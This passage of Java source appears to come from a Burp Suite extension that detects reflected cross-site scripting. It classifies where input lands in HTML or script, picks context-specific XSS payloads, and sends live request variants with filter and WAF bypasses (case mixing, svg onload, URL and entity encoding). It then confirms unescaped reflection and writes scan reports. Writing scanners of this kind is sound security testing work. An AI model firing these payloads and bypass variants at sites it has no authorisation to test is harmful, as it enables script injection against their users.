                        i += 2;
                        continue;
                    }
                    if (c == '"' || c == '\'' || c == '`') {
                        jsQuote = c;
                        i++;
                        break;
                    }
                    i++;
                    break;
                }
                case RAW_STYLE: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</style")) {
                        mode = DATA;
                        i += 2;
                        continue;
                    }
                    i++;
                    break;
                }
                case RAW_TEXT: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</" + rawTag)) {
                        mode = DATA;
                        rawTag = "";
                        i += 2;
                        continue;
                    }
                    i++;
                    break;
                }
                case PLAIN:
                default:
                    i++;
            }
        }

        switch (mode) {
            case COMMENT:
                r.ctx = Ctx.HTML_COMMENT;
                return r;
            case RAW_STYLE:
                r.ctx = Ctx.STYLE;
                return r;
            case RAW_TEXT:
                r.ctx = Ctx.RAWTEXT;
                r.rawTag = rawTag;
                return r;
            case PLAIN:
                r.ctx = Ctx.PLAINTEXT;
                return r;
            case RAW_SCRIPT:
                if (jsQuote == '`') {
                    r.ctx = Ctx.SCRIPT_TEMPLATE;
                } else if (jsQuote == '\'') {
                    r.ctx = Ctx.SCRIPT_STRING_SINGLE;
                } else if (jsQuote == '"') {
                    r.ctx = Ctx.SCRIPT_STRING_DOUBLE;
                } else {
                    r.ctx = Ctx.SCRIPT_DATA;
                }
                return r;
            case TAG:
                r.attrName = attrName;
                r.valueAtStart = (valueStartPos == pos);
                if (attrQuote == '"' || attrQuote == '\'') {
                    if (isEventHandler(attrName)) {
                        r.ctx = Ctx.EVENT_HANDLER;
                    } else if (isUrlAttr(attrName)) {
                        r.ctx = Ctx.ATTR_URL;
                    } else {
                        r.ctx = (attrQuote == '"') ? Ctx.ATTR_DOUBLE : Ctx.ATTR_SINGLE;
                    }
                } else if (inAttrValue) {
                    if (isEventHandler(attrName)) {
                        r.ctx = Ctx.EVENT_HANDLER;
                    } else if (isUrlAttr(attrName)) {
                        r.ctx = Ctx.ATTR_URL;
                    } else {
                        r.ctx = Ctx.ATTR_UNQUOTED;
                    }
                } else {
                    r.ctx = Ctx.TAG_NAME_OR_ATTR;
                }
                return r;
            default:
                r.ctx = Ctx.HTML_TEXT;
                return r;
        }
    }

    /** Returns the body-mode to enter after a tag's ">" ( {mode} ). */
    private int[] enterBody(String tagName) {
        if ("script".equals(tagName)) {
            return new int[]{3};
        }
        if ("style".equals(tagName)) {
            return new int[]{4};
        }
        if ("plaintext".equals(tagName)) {
            return new int[]{6};
        }
        if (RAWTEXT_ELEMENTS.contains(tagName)) {
            return new int[]{5};
        }
        return new int[]{0};
    }

    // ------------------------------------------------------------------
    // Exploitability evaluation (confirmed-only; zero tolerance for guesses)
    // ------------------------------------------------------------------

    private Finding evaluateSite(String body, int siteStart, String tag, MimeInfo mime) {
        Map<Character, CharFate> fate = decodeSurvival(body, siteStart, tag);

        if (mime.isJson || mime.isJavaScript) {
            Finding jf = evaluateJson(body, siteStart, tag, fate, mime);
            if (jf != null) {
                jf.fate = fate;
                return jf;
            }
            if (!mime.htmlRenderable) {
                return null; // structured data not reachable as markup
            }
        }

        CtxResult c = detectContext(body, siteStart);
        Finding f = evaluateHtml(c, fate);
        if (f != null) {
            f.fate = fate;
        }
        return f;
    }

    /**
     * Build an OPTIMISTIC finding for a reflection whose context is known but whose
     * character survival could not be measured (the aggressive break-out probe was
     * filtered/blocked). We assume every break-out character might survive and pick
     * the context's strongest payload; confirm() then VERIFIES it empirically by
     * injecting that single realistic payload and checking it reflects unescaped --
     * so this never causes a false positive, it only gives confirmation a chance
     * when the mega-probe was rejected. Returns null for inert contexts.
     */
    private Finding optimisticFinding(String body, int idx, MimeInfo mime) {
        try {
            Map<Character, CharFate> allSurvive = new HashMap<>();
            for (char ch : SPECIALS) {
                CharFate cf = new CharFate();
                cf.present = true;
                cf.unescaped = true;
                allSurvive.put(ch, cf);
            }
            if (mime.isJson || mime.isJavaScript) {
                Finding jf = evaluateJson(body, idx, "", allSurvive, mime);
                if (jf != null) {
                    return jf;
                }
                if (!mime.htmlRenderable) {
                    return null;
                }
            }
            CtxResult c = detectContext(body, idx);
            return evaluateHtml(c, allSurvive);
        } catch (Exception e) {
            return null;
        }
    }

    private Finding evaluateHtml(CtxResult c, Map<Character, CharFate> fate) {
        boolean lt = present(fate, '<');
        boolean gt = present(fate, '>');
        boolean sp = present(fate, ' ');
        boolean slash = present(fate, '/');

        switch (c.ctx) {
            case HTML_TEXT: {
                if (lt && gt) {
                    return hi(c.ctx, "HTML text", 100.0, "<img src=x onerror=alert(1)>",
                            "< and > are reflected unencoded in HTML text, allowing arbitrary tag injection.");
                }
                if (lt) {
                    return hi(c.ctx, "HTML text", 92.0, "<svg onload=alert(1)>",
                            "< is reflected unencoded in HTML text; a tag can be injected (the browser auto-completes the markup).");
                }
                return null;
            }
            case HTML_COMMENT: {
                if (gt && lt) {
                    return med(c.ctx, "HTML comment", 88.0, "--><img src=x onerror=alert(1)>",
                            "The comment can be closed with --> (< and > survive) and a new tag injected.");
                }
                return null;
            }
            case TAG_NAME_OR_ATTR: {
                if (sp) {
                    return hi(c.ctx, "Tag / attribute-name position", 99.0, " autofocus onfocus=alert(1) ",
                            "The reflection sits where a new attribute can be added; an event-handler attribute injects JavaScript.");
                }
                if (gt && lt) {
                    return hi(c.ctx, "Tag / attribute-name position", 96.0, "><img src=x onerror=alert(1)>",
                            "The tag can be closed with > and a new element injected.");
                }
                return null;
            }
            case ATTR_DOUBLE: {
                boolean q = unescaped(fate, '"');
                if (q && lt && gt) {
                    return hi(c.ctx, "Double-quoted attribute", 100.0, "\"><img src=x onerror=alert(1)>",
                            "The double quote is reflected unencoded, breaking out of the attribute, and < > allow tag injection.");
                }
                if (q && sp) {
                    return hi(c.ctx, "Double-quoted attribute", 97.0, "\" autofocus onfocus=alert(1) x=\"",
                            "The double quote breaks out of the attribute value and a new event-handler attribute can be added.");
                }
                return null;
            }
            case ATTR_SINGLE: {
                boolean q = unescaped(fate, '\'');
                if (q && lt && gt) {
                    return hi(c.ctx, "Single-quoted attribute", 100.0, "'><img src=x onerror=alert(1)>",
                            "The single quote is reflected unencoded, breaking out of the attribute, and < > allow tag injection.");
                }
                if (q && sp) {
                    return hi(c.ctx, "Single-quoted attribute", 97.0, "' autofocus onfocus=alert(1) x='",
                            "The single quote breaks out of the attribute value and a new event-handler attribute can be added.");
                }
                return null;
            }
            case ATTR_UNQUOTED: {
                if (sp) {
                    return hi(c.ctx, "Unquoted attribute", 98.0, " onmouseover=alert(1) ",
                            "The value is unquoted and whitespace survives, so an event-handler attribute can be appended directly.");
                }
                if (gt && lt) {
                    return hi(c.ctx, "Unquoted attribute", 96.0, "><img src=x onerror=alert(1)>",
                            "The unquoted value can be terminated with > and a new element injected.");
                }
                return null;
            }
            case ATTR_URL: {
                boolean colon = present(fate, ':');
                if (c.valueAtStart && colon) {
                    return hi(c.ctx, "URL attribute (scheme)", 94.0, "javascript:alert(1)",
                            "The value controls the start of a URL-bearing attribute; the javascript: scheme executes on activation.");
                }
                boolean q = unescaped(fate, '"') || unescaped(fate, '\'');
                if (q && lt && gt) {
                    return hi(c.ctx, "URL attribute", 92.0, "\"><img src=x onerror=alert(1)>",
                            "The quote delimiting the URL attribute is reflected unencoded, allowing break-out and tag injection.");
                }
                return null;
            }
            case EVENT_HANDLER: {
                boolean q = unescaped(fate, '"') || unescaped(fate, '\'');
                if (q) {
                    return hi(c.ctx, "Event handler (JavaScript)", 99.0, "';alert(1);//",
                            "The reflection is inside an on* event-handler value and the surrounding quote is reflected unencoded, so JavaScript can be injected.");
                }
                return hi(c.ctx, "Event handler (JavaScript)", 93.0, "-alert(1)-",
                        "The reflection is inside an on* event-handler value (a JavaScript execution context).");
            }
            case SCRIPT_DATA: {
                if (lt && slash) {
                    return hi(c.ctx, "Inline <script> block", 100.0, "</script><img src=x onerror=alert(1)>",
                            "The reflection is in an inline script block; </script> closes it and a new element is injected.");
                }
                return hi(c.ctx, "Inline <script> block", 98.0, ";alert(1);//",
                        "The reflection is directly inside an inline <script> block (a JavaScript execution context).");
            }
            case SCRIPT_STRING_DOUBLE: {
                if (unescaped(fate, '"')) {
                    return hi(c.ctx, "JavaScript string (double-quoted)", 99.0, "\";alert(1);//",
                            "The double quote is reflected unescaped inside a JavaScript string literal, allowing the string to be broken and code injected.");
                }
                if (lt && slash) {
                    return hi(c.ctx, "JavaScript string (double-quoted)", 92.0, "</script><img src=x onerror=alert(1)>",
                            "The string cannot be broken directly, but </script> terminates the script element (< and / survive), allowing tag injection.");
                }
                return null;
            }
            case SCRIPT_STRING_SINGLE: {
                if (unescaped(fate, '\'')) {
                    return hi(c.ctx, "JavaScript string (single-quoted)", 99.0, "';alert(1);//",
                            "The single quote is reflected unescaped inside a JavaScript string literal, allowing the string to be broken and code injected.");
                }
                if (lt && slash) {
                    return hi(c.ctx, "JavaScript string (single-quoted)", 92.0, "</script><img src=x onerror=alert(1)>",
                            "The string cannot be broken directly, but </script> terminates the script element (< and / survive), allowing tag injection.");
                }
                return null;
            }
            case SCRIPT_TEMPLATE: {
                boolean dollar = present(fate, '$');
                boolean ob = present(fate, '{');
                boolean cb = present(fate, '}');
                if (dollar && ob && cb) {
                    return hi(c.ctx, "JavaScript template literal", 99.0, "${alert(1)}",
                            "Inside a template literal, ${...} is evaluated as JavaScript and the required characters survive.");
                }
                if (unescaped(fate, '`')) {
                    return hi(c.ctx, "JavaScript template literal", 96.0, "`;alert(1);//",
                            "The backtick is reflected unescaped, breaking out of the template literal.");
                }
                return null;
            }
            case STYLE: {
                if (lt && slash) {
                    return med(c.ctx, "Inline <style> block", 85.0, "</style><img src=x onerror=alert(1)>",
                            "The reflection is inside a style block; </style> closes it (< and / survive), allowing tag injection.");
                }
                return null;
            }
            case RAWTEXT: {
                // textarea/title/iframe/xmp/... : only the matching end tag breaks out.
                if (lt && slash && gt) {
                    String close = "</" + (c.rawTag.isEmpty() ? "textarea" : c.rawTag) + ">";
                    return hi(c.ctx, "Rawtext element <" + (c.rawTag.isEmpty() ? "textarea" : c.rawTag) + ">", 90.0,
                            close + "<img src=x onerror=alert(1)>",
                            "The reflection is inside a rawtext/RCDATA element; the matching end tag " + close
                            + " closes it (< / > survive), allowing tag injection.");
                }
                return null; // cannot break out -> not a false positive
            }
            case PLAINTEXT:
            default:
                return null; // <plaintext> cannot be escaped; never report
        }
    }

    private Finding evaluateJson(String body, int siteStart, String tag,
                                 Map<Character, CharFate> fate, MimeInfo mime) {
        int blockEnd = Math.min(body.length(), siteStart + tag.length() * (SPECIALS.length + 2) + 64 * SPECIALS.length);
        String block = body.substring(siteStart, blockEnd);
        String[] parts = block.split(java.util.regex.Pattern.quote(tag), -1);
        String after = parts.length > 0 ? parts[parts.length - 1] : "";
        boolean nearStart = siteStart <= firstNonWhitespace(body) + 2;

        if ((mime.isJavaScript || mime.isJson) && nearStart && after.trim().startsWith("(")) {
            Finding f = hi(Ctx.JSONP, "JSONP callback", 96.0, "alert(1)",
                    "The response is JSONP: the reflected parameter is used as the callback function name and executed directly as JavaScript.");
            f.isJson = true;
            return f;
        }

        boolean lt = present(fate, '<');
        boolean gt = present(fate, '>');
        boolean quote = unescaped(fate, '"');
        boolean slash = present(fate, '/');

        // JSON body a browser will render as HTML (wrong/sniffable Content-Type).
        if (mime.htmlRenderable && lt && gt) {
            Finding f = hi(Ctx.JSON_STRING, "JSON rendered as HTML", 92.0, "<img src=x onerror=alert(1)>",
                    "The JSON body is served with a Content-Type a browser treats as HTML (" + mime.describe()
                    + ") and < > are reflected unencoded, so injected markup executes.");
            f.isJson = true;
            return f;
        }
        // JSON string break-out: the string delimiter (") is reflected unescaped
        // (not \") and markup characters survive, so the string can be closed and
        // a tag injected. Only reported when the body is html-rendered, so it
        // stays a true positive.
        if (mime.htmlRenderable && quote && lt && slash) {
            Finding f = hi(Ctx.JSON_STRING, "JSON string break-out", 90.0, "\"></script><img src=x onerror=alert(1)>",
                    "The JSON string delimiter (\") is reflected unescaped and < / survive, so the string can be "
                    + "closed and markup injected in this html-rendered JSON response.");
            f.isJson = true;
            return f;
        }
        // '<' alone can still open a tag (the browser auto-completes) when rendered as HTML.
        if (mime.htmlRenderable && lt) {
            Finding f = med(Ctx.JSON_STRING, "JSON rendered as HTML", 86.0, "<svg onload=alert(1)>",
                    "The JSON body is rendered as HTML (" + mime.describe()
                    + ") and < is reflected unencoded, allowing tag injection.");
            f.isJson = true;
            return f;
        }
        return null;
    }

    // ------------------------------------------------------------------
    // Stage 2: live confirmation of the proof-of-concept
    // ------------------------------------------------------------------

    /**
     * Stage 2: try a series of context-specific payload variants (encoding /
     * keyword / tag / alert-prompt-confirm bypasses) until one is reflected
     * verbatim and unescaped. Records every attempt (for the Edited 1,2,3...
     * request/response views) and reports the winning exploit payload.
     */
    /** A confirmation attempt: inject {@code inject}, expect {@code expect} back. */
    private static final class Variant {
        final String inject;   // value placed into the parameter
        final String expect;   // what must appear unescaped in the response
        final String label;
        Variant(String inject, String expect, String label) {
            this.inject = inject;
            this.expect = expect;
            this.label = label;
        }
    }

    private Confirmation confirm(Injector injector, IHttpService service, Finding f) {
        Confirmation conf = new Confirmation();
        try {
            List<Variant> variants = pocVariants(f);
            int tried = 0;
            for (Variant v : variants) {
                if (tried >= 12) {
                    break; // bound the number of live requests
                }
                tried++;
                String lm = randomCanary();
                String rm = randomCanary();
                String value = lm + v.inject + rm;
                IHttpRequestResponse rr;
                try {
                    rr = callbacks.makeHttpRequest(service, injector.build(value));
                } catch (Exception e) {
                    continue;
                }
                if (rr == null || rr.getResponse() == null) {
                    continue;
                }
                byte[] respBytes = rr.getResponse();
                IResponseInfo info = helpers.analyzeResponse(respBytes);
                int off = info.getBodyOffset();
                String bodyStr = new String(Arrays.copyOfRange(respBytes, off, respBytes.length), StandardCharsets.UTF_8);
                int l = bodyStr.indexOf(lm);
                boolean ok = false;
                if (l >= 0) {
                    int segStart = l + lm.length();
                    int r = bodyStr.indexOf(rm, segStart);
                    String segment = (r > segStart) ? bodyStr.substring(segStart, r)
                            : bodyStr.substring(segStart, Math.min(bodyStr.length(), segStart + v.expect.length() + 8));
                    // Check the response for the EXECUTABLE (decoded) form, not the
                    // injected bytes -- this catches double/extra-decoding contexts
                    // where an encoded payload comes back decoded.
                    ok = containsUnescaped(segment, v.expect);
                }
                conf.attempts.add(new Attempt("Edited " + (conf.attempts.size() + 1)
                        + (ok ? " - PoC (confirmed)" : " - " + v.label), v.expect, value, rr, ok));
                if (ok) {
                    conf.requestResponse = rr;
                    conf.injectedValue = value;
                    conf.poc = v.expect;
                    conf.technique = v.label;
                    conf.confirmed = true;
                    conf.snippet = buildSnippet(bodyStr, Math.max(0, l - 24),
                            v.expect.length() + lm.length() + rm.length() + 48);
                    return conf;
                }
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[XSSDetector] confirm: " + e.getMessage());
            }
        }
        return conf; // conf.confirmed == false
    }

    /**
     * Ordered confirmation variants for a context: the primary PoC first, then
     * filter/keyword bypasses (svg vs img, case mixing, slash tricks), the
     * alert / confirm / prompt sink functions, and ENCODING bypasses where an
     * encoded payload is injected but the decoded form is expected back (for
     * apps that URL-decode an extra time).
     */
    private List<Variant> pocVariants(Finding f) {
        List<Variant> out = new ArrayList<>();
        String base = f.poc;
        add(out, new Variant(base, base, "direct"));

        int lt = base.indexOf('<');
        if (lt >= 0 && base.indexOf('>', lt) > lt) {
            // Tag-injection payload: keep the break-out prefix, swap the tag body.
            String prefix = base.substring(0, lt);
            add(out, new Variant(prefix + "<img src=x onerror=alert(document.domain)>",
                    prefix + "<img src=x onerror=alert(document.domain)>", "alert(document.domain)"));
            add(out, new Variant(prefix + "<svg onload=alert(document.domain)>",
                    prefix + "<svg onload=alert(document.domain)>", "svg onload"));
            add(out, new Variant(prefix + "<img src=x onerror=confirm(1)>",
                    prefix + "<img src=x onerror=confirm(1)>", "confirm()"));
            add(out, new Variant(prefix + "<img src=x onerror=prompt(1)>",
                    prefix + "<img src=x onerror=prompt(1)>", "prompt()"));
            add(out, new Variant(prefix + "<img src=x OnErRoR=alert(1)>",
                    prefix + "<img src=x OnErRoR=alert(1)>", "case-mixing"));
            add(out, new Variant(prefix + "<svg/onload=alert(1)>",
                    prefix + "<svg/onload=alert(1)>", "slash separator"));
        } else {
            // JS / attribute / URL payload: vary the sink function only.
            add(out, new Variant(base.replace("alert(1)", "alert(document.domain)"),
                    base.replace("alert(1)", "alert(document.domain)"), "alert(document.domain)"));
            add(out, new Variant(base.replace("alert(1)", "confirm(1)"),
                    base.replace("alert(1)", "confirm(1)"), "confirm()"));
            add(out, new Variant(base.replace("alert(1)", "prompt(1)"),
                    base.replace("alert(1)", "prompt(1)"), "prompt()"));
        }

        // Encoding bypasses: inject the ENCODED payload but expect the DECODED
        // payload in the response (apps that decode an extra time -- a common WAF
        // bypass). Confirmed only when the executable form actually comes back.
        add(out, new Variant(pctEncode(base), base, "double-URL-encoded"));
        add(out, new Variant(pctEncodeAll(base), base, "full-URL-encoded"));
        add(out, new Variant(htmlEntityEncode(base), base, "HTML-entity-encoded"));
        add(out, new Variant(numericEntityEncode(base), base, "HTML numeric-entity-encoded"));
        return out;
    }

    /** Named HTML entities for the XSS-significant characters. */
    private String htmlEntityEncode(String s) {
        StringBuilder b = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '<': b.append("&lt;"); break;
                case '>': b.append("&gt;"); break;
                case '"': b.append("&quot;"); break;
                case '\'': b.append("&#39;"); break;
                default: b.append(c);
            }
        }
        return b.toString();
    }

    /** Decimal HTML numeric entities for every character. */
    private String numericEntityEncode(String s) {
        StringBuilder b = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            b.append("&#").append((int) s.charAt(i)).append(';');
        }
        return b.toString();
    }

    private void add(List<Variant> list, Variant v) {
        if (v == null || v.inject == null || v.inject.isEmpty()) {
            return;
        }
        for (Variant e : list) {
            if (e.inject.equals(v.inject)) {
                return; // de-dup identical injections
            }
        }
        list.add(v);
    }

    /** Percent-encode only the XSS-significant characters. */
    private String pctEncode(String s) {
        StringBuilder b = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '<': b.append("%3C"); break;
                case '>': b.append("%3E"); break;
                case '"': b.append("%22"); break;
                case '\'': b.append("%27"); break;
                case '/': b.append("%2F"); break;
                case ' ': b.append("%20"); break;
                case '=': b.append("%3D"); break;
                case '(': b.append("%28"); break;
                case ')': b.append("%29"); break;
                default: b.append(c);
            }
        }
        return b.toString();
    }

    /** Percent-encode every byte (aggressive full encoding). */
    private String pctEncodeAll(String s) {
        StringBuilder b = new StringBuilder();
        byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
        for (byte x : bytes) {
            b.append('%').append(String.format("%02X", x & 0xFF));
        }
        return b.toString();
    }

    private void add(List<String> list, String s) {
        if (s != null && !s.isEmpty() && !list.contains(s)) {
            list.add(s);
        }
    }

    /**
     * True if {@code poc} appears in {@code segment} unencoded, and -- when the
     * payload leads with a string delimiter -- not neutralised by a backslash.
     */
    private boolean containsUnescaped(String segment, String poc) {
        if (segment == null || poc.isEmpty()) {
            return false;
        }
        boolean quoteLed = poc.charAt(0) == '"' || poc.charAt(0) == '\'' || poc.charAt(0) == '`';
        int from = 0;
        while (true) {
            int idx = segment.indexOf(poc, from);
            if (idx < 0) {
                return false;
            }
            if (!quoteLed || idx == 0 || segment.charAt(idx - 1) != '\\') {
                return true;
            }
            from = idx + 1;
        }
    }

    // ------------------------------------------------------------------
    // Dynamic, remediation-free issue construction
    // ------------------------------------------------------------------

    private IScanIssue buildDynamicIssue(String param, String insType, String source,
                                         Finding f, Confirmation conf,
                                         IHttpRequestResponse baseRR, ProbeResult pr) {
        try {
            IHttpRequestResponse evidence = conf.requestResponse;
            URL url = helpers.analyzeRequest(evidence).getUrl();

            // Use the exploit payload that actually confirmed (a bypass variant may
            // have been needed), so the report/markers reflect what really works.
            if (conf.poc != null && !conf.poc.isEmpty()) {
                f.poc = conf.poc;
            }

            // Markers over the live request value and the reflected payload.
            List<int[]> reqMarkers = markers(evidence.getRequest(), conf.injectedValue);
            List<int[]> respMarkers = markers(evidence.getResponse(), f.poc);
            IHttpRequestResponse marked;
            try {
                marked = callbacks.applyMarkers(evidence, reqMarkers, respMarkers);
            } catch (Exception e) {
                marked = evidence;
            }

            // Professional, Burp-consistent issue name; parameter/context in the detail.
            String name = "Cross-Site Scripting (Reflected)";
            String detail = renderDetail(f, param, insType, conf.technique);

            // Feed the Live Results view (confirmed by live PoC).
            try {
                IHttpService svc = evidence.getHttpService();
                String method = "";
                try {
                    method = helpers.analyzeRequest(evidence).getMethod();
                } catch (Exception ignored) {
                    // method is best-effort
                }
                XssFinding xf = new XssFinding(
                        f.severity, XssFinding.STATUS_CONFIRMED, f.contextLabel, param,
                        method, svc != null ? svc.getHost() : "", url != null ? url.toString() : "",
                        source, f.poc, evidence.getRequest(), evidence.getResponse());
                xf.reqHighlight = conf.injectedValue; // the injected probe value in the request
                xf.respHighlight = f.poc;             // the payload as reflected in the response
                xf.technique = conf.technique;        // which bypass technique confirmed it
                if (svc != null) {
                    xf.port = svc.getPort();
                    xf.https = "https".equalsIgnoreCase(svc.getProtocol());
                }
                // Original request/response + the probe + every edited attempt
                // (Edited 1, 2, 3 ...), each with its own marker, like Burp's viewer.
                if (baseRR != null && baseRR.getRequest() != null) {
                    xf.messages.add(new XssFinding.Msg("Original", baseRR.getRequest(), baseRR.getResponse(), null, null));
                }
                if (pr != null && pr.probeRR != null) {
                    xf.messages.add(new XssFinding.Msg("Probe (break-out test)", pr.probeRR.getRequest(),
                            pr.probeRR.getResponse(), pr.tag, pr.tag));
                }
                if (!conf.attempts.isEmpty()) {
                    for (Attempt a : conf.attempts) {
                        if (a.rr == null) {
                            continue;
                        }
                        xf.messages.add(new XssFinding.Msg(a.label, a.rr.getRequest(), a.rr.getResponse(),
                                a.injectedValue, a.poc));
                    }
                } else {
                    xf.messages.add(new XssFinding.Msg("Edited - PoC", evidence.getRequest(),
                            evidence.getResponse(), conf.injectedValue, f.poc));
                }
                FindingStore.get().add(xf);
            } catch (Exception ignored) {
                // never let reporting-side wiring break issue creation
            }

            return new DynamicScanIssue(
                    evidence.getHttpService(), url, new IHttpRequestResponse[]{marked},
                    name, f.severity, "Certain", detail);
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[ContextualReflectionEngine] issue build failed: " + e.getMessage());
            }
            return null;
        }
    }

    /**
     * Record a REFLECTED finding for a reflection that WAS actively tested but did
     * not break out, attaching the full test log (Original request/response, the
     * break-out probe, and every Edited payload tried with its own response and
     * markers). This is what lets the Live Results viewer show, under the
     * Original/Edited selector, exactly which contextual payloads were fired at the
     * reflected parameter and how the app handled each one -- even when nothing was
     * confirmed. Never reported as a Burp issue (Info only).
     */
    private void recordTestedReflection(String param, String source, Finding f,
                                        Confirmation conf, ProbeResult pr, IHttpRequestResponse baseRR) {
        try {
            IHttpService svc = baseRR != null ? baseRR.getHttpService() : null;
            String method = "";
            String url = "";
            String host = svc != null ? svc.getHost() : "";
            if (baseRR != null) {
                try {
                    IRequestInfo ri = helpers.analyzeRequest(baseRR);
                    method = ri.getMethod();
                    url = ri.getUrl() != null ? ri.getUrl().toString() : "";
                } catch (Exception ignored) {
                    // best-effort
                }
            }
            int tried = conf != null ? conf.attempts.size() : 0;
            XssFinding xf = new XssFinding(
                    "Info", XssFinding.STATUS_REFLECTED, f.contextLabel, param,
                    method, host, url, source,
                    "Reflected in " + f.contextLabel + ". Tested " + tried
                    + " contextual payload(s); none broke out as injected (the application "
                    + "filtered or encoded the break-out characters). See the Edited request/"
                    + "response variants for exactly what was tried.",
                    baseRR != null ? baseRR.getRequest() : null,
                    baseRR != null ? baseRR.getResponse() : null);
            xf.reqHighlight = pr != null ? pr.tag : null;
            xf.respHighlight = pr != null ? pr.tag : null;
            if (svc != null) {
                xf.port = svc.getPort();
                xf.https = "https".equalsIgnoreCase(svc.getProtocol());
            }
            if (baseRR != null && baseRR.getRequest() != null) {
                xf.messages.add(new XssFinding.Msg("Original", baseRR.getRequest(), baseRR.getResponse(), null, null));
            }
            if (pr != null && pr.probeRR != null) {
                xf.messages.add(new XssFinding.Msg("Probe (break-out test)", pr.probeRR.getRequest(),
                        pr.probeRR.getResponse(), pr.tag, pr.tag));
            }
            if (conf != null) {
                for (Attempt a : conf.attempts) {
                    if (a.rr == null) {
                        continue;
                    }
                    xf.messages.add(new XssFinding.Msg(a.label, a.rr.getRequest(), a.rr.getResponse(),
                            a.injectedValue, a.poc));
                }
            }
            FindingStore.get().add(xf);
        } catch (Exception ignored) {
            // reporting side must never break detection
        }
    }

    /**
     * Record a REFLECTED finding when the parameter reflects (verified with a token)
     * but no break-out character survived -- either the context encodes them, or the
     * aggressive probe was filtered. Info only; shows the probe request/response so
     * the user sees the reflection was found, not missed.
     */
    private void recordReflectedFiltered(String param, String source, ProbeResult pr, IHttpRequestResponse baseRR) {
        try {
            if (pr == null || !pr.reflected) {
                return;
            }
            IHttpService svc = baseRR != null ? baseRR.getHttpService() : null;
            String method = "";
            String url = "";
            String host = svc != null ? svc.getHost() : "";
            if (baseRR != null) {
                try {
                    IRequestInfo ri = helpers.analyzeRequest(baseRR);
                    method = ri.getMethod();
                    url = ri.getUrl() != null ? ri.getUrl().toString() : "";
                } catch (Exception ignored) {
                    // best-effort
                }
            }
            String ctx = pr.contextLabel != null ? pr.contextLabel : "unknown";
            XssFinding xf = new XssFinding(
                    "Info", XssFinding.STATUS_REFLECTED, ctx, param,
                    method, host, url, source,
                    "Reflected in " + ctx + ". " + pr.diag
                    + " -- not exploitable as tested.",
                    baseRR != null ? baseRR.getRequest() : null,
                    baseRR != null ? baseRR.getResponse() : null);
            xf.reqHighlight = pr.tag;
            xf.respHighlight = pr.tag;
            if (svc != null) {
                xf.port = svc.getPort();
                xf.https = "https".equalsIgnoreCase(svc.getProtocol());
            }
            if (baseRR != null && baseRR.getRequest() != null) {
                xf.messages.add(new XssFinding.Msg("Original", baseRR.getRequest(), baseRR.getResponse(), null, null));
            }
            if (pr.probeRR != null && pr.probeRR.getRequest() != null) {
                xf.messages.add(new XssFinding.Msg("Probe (reflection test)", pr.probeRR.getRequest(),
                        pr.probeRR.getResponse(), pr.tag, pr.tag));
            }
            FindingStore.get().add(xf);
        } catch (Exception ignored) {
            // reporting must never break detection
        }
    }

    /** Only live, dynamic evidence -- no remediation or static background. */
    private String renderDetail(Finding f, String param, String insType, String technique) {
        StringBuilder d = new StringBuilder();
        d.append("<p><b>Confirmed reflected cross-site scripting</b> - detected by a live context probe and verified by injecting the proof-of-concept.</p>");
        // Parameter kept as plain text immediately after the label so Burp and the
        // de-duplicator read it correctly (distinct parameters stay distinct issues).
        d.append("<p><b>Parameter:</b> ").append(esc(param)).append(" <i>(").append(esc(insType)).append(")</i></p>");
        d.append("<p><b>Reflection context:</b> ").append(esc(f.contextLabel)).append("</p>");
        if (technique != null && !technique.isEmpty()) {
            d.append("<p><b>Confirmed via:</b> ").append(esc(technique))
             .append(" &mdash; the payload executes alert()/confirm()/prompt() in the browser.</p>");
        }
        d.append("<p><b>Why it is exploitable:</b> ").append(esc(f.reason)).append("</p>");

        d.append("<h4>Break-out character test (live)</h4>");
        d.append("<p>Each character was injected at the reflection point; the response shows how the application handled it:</p>");
        d.append("<table cellpadding=\"3\" cellspacing=\"0\" border=\"1\">");
        d.append("<tr><th>Character</th><th>Result at reflection point</th></tr>");
        if (f.fate != null) {
            for (char c : SPECIALS) {
                CharFate cf = f.fate.get(c);
                if (cf == null) {
                    continue;
                }
                d.append("<tr><td><code>").append(esc(displayChar(c))).append("</code></td><td>")
                 .append(fateLabel(cf)).append("</td></tr>");
            }
        }
        d.append("</table>");

        d.append("<h4>Proof of concept (confirmed)</h4>");
        d.append("<p>Set <code>").append(esc(param)).append("</code> to:</p>");
        d.append("<pre>").append(esc(f.poc)).append("</pre>");
        d.append("<p>This payload was injected and observed reflected unencoded in the response.</p>");

        if (confSnippet(f) != null) {
            d.append("<h4>Live reflection</h4>");
            d.append("<pre>").append(confSnippet(f)).append("</pre>");
        }
        return d.toString();
    }

    private String confSnippet(Finding f) {
        return f.snippet; // already HTML-escaped
    }

    private String fateLabel(CharFate cf) {
        if (cf.present && cf.unescaped && !cf.htmlEncoded) {
            return "<span style=\"color:#b00020\"><b>Reflected UNENCODED</b></span>";
        }
        if (cf.present && cf.backslashEscaped) {
            return "Backslash-escaped (\\)";
        }
        if (cf.htmlEncoded) {
            return "HTML-entity-encoded";
        }
        if (cf.urlEncoded) {
            return "URL-encoded";
        }
        if (cf.present) {
            return "Reflected (neutralised)";
        }
        return "Stripped / blocked";
    }

    // ------------------------------------------------------------------
    // Small helpers
    // ------------------------------------------------------------------

    private Finding hi(Ctx ctx, String label, double conf, String poc, String reason) {
        return mk(ctx, label, conf, poc, reason, "High");
    }

    private Finding med(Ctx ctx, String label, double conf, String poc, String reason) {
        return mk(ctx, label, conf, poc, reason, "Medium");
    }

    private Finding mk(Ctx ctx, String label, double conf, String poc, String reason, String severity) {
        Finding f = new Finding();
        f.ctx = ctx;
        f.contextLabel = label;
        f.confidence = conf;
        f.poc = poc;
        f.reason = reason;
        f.severity = severity;
        return f;
    }

    private boolean present(Map<Character, CharFate> fate, char c) {
        CharFate f = fate.get(c);
        return f != null && f.present;
    }

    private boolean unescaped(Map<Character, CharFate> fate, char c) {
        CharFate f = fate.get(c);
        return f != null && f.present && f.unescaped && !f.htmlEncoded;
    }

    private List<int[]> markers(byte[] data, String needle) {
        List<int[]> out = new ArrayList<>();
        try {
